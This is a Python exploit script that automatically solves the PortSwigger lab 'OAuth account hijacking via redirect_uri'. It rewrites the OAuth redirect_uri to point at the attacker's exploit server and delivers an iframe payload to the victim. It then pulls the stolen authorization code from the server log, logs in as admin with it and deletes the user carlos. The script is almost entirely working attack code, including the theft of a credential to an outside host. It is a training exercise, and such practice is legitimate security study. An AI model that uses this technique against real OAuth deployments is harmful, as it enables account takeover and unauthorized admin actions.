# OAuth account hijacking via redirect_uri

# https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r

def init_auth(s, url):
	print('\n[+] Trying to generate a oauth token logging in as Wiener...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	time.sleep(1)
	link = re.search(r"http-equiv=refresh content='3;url=(.*)'>", r.text).group(1)
	print('\n[+] Found Redirection:\t%s' % link)
	return link

def delete_carlos(s, url, attacker, link):
	print('\n[+] Logging out...\n')
	file_path = url + '/redirect_uri'
	log_path = f'https://{attacker}/log'
	r = s.get(url + '/logout')
	time.sleep(1)
	redirect_host = re.search(r'&redirect_uri=(.*)/oauth-callback&response_type=code&scope=openid%20profile%20email', link).group(1)
	oauth_link = link.replace(redirect_host, 'https://' + attacker)
	print('[+] Sending the link url to the victim to link his account...')
	exploit_body = f'<iframe src="{oauth_link}"></iframe>'
	r = send_payload(s, file_path, exploit_body, 'https://' + attacker)
	time.sleep(7)
	r = s.get(log_path)
	time.sleep(1)
	code = re.findall(r'GET /oauth-callback\?code=(.*) HTTP/1.1&quot; 404', r.text)[-1]
	print('\n[+] Found Oauth code:\t%s' % code)
	time.sleep(1)
	oauth_path = f'{url}/oauth-callback?code={code}'
	print('[+] Trying to logging in as Admin following:\t%s' % oauth_path)
	r = s.get(oauth_path)
	time.sleep(1)
	r = s.get(url + '/admin')
	if '/admin/delete' in r.text:
		print('[+] Trying to delete Carlos account...')
		r = s.get(url + '/admin/delete?username=carlos')

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: OAuth account hijacking via redirect_uri')
	parser = argparse.ArgumentParser(description="[+] Lab: OAuth account hijacking via redirect_uri")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		exploit_srv = find_exploit_srv(r)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			r = s.get(url)
			parsed_atk = urllib.parse.urlparse(exploit_srv)
			if parsed_atk.netloc == b'':
				print('[-] Cannot find exploit server... Already solved <!>')
				sys.exit(1)
			link = init_auth(s, url)
			time.sleep(2)
			r = delete_carlos(s, url, parsed_atk.netloc, link)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
